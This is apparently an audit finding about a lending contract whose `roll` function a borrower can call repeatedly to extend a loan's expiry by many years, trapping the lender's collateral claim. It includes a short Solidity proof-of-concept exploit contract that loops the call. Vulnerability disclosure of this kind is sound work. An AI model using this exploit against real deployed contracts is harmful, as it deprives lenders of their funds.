# Leader never get back collateral or debt token

## Summary
When any leader clear loan it always start with rollable loan. Now After clear loan malicious owner call roll function 200 or 300 times and `loan.expiry` time increase by 200x or 300x times. 

## Vulnerability Detail
POC :

For Example:- Leander A clear loan id `1` which has expiry time is 1 year. Borrower see this and after this call he call `roll` with 100 times and increase expiry time.

```solidity
interface Cooler {
      function roll(uint256 id) external;
}

contract Expolit{
            function increaseLoanExpiry(address target, uint256 id) public {
                        for(uint256 i; i < 100; ++i) 
                               Cooler(target).roll(id);
            }
}
```

After calling increaseLoanExpiry function loan expiry time increase by 100 year which means leader can get back collateral after 100 year if borrower doesn't paid loan. 
 
## Impact
Leader never get back any collateral or debt token.

Re-write the roll function logic or put some access control how many times loan can roll within expiry period.
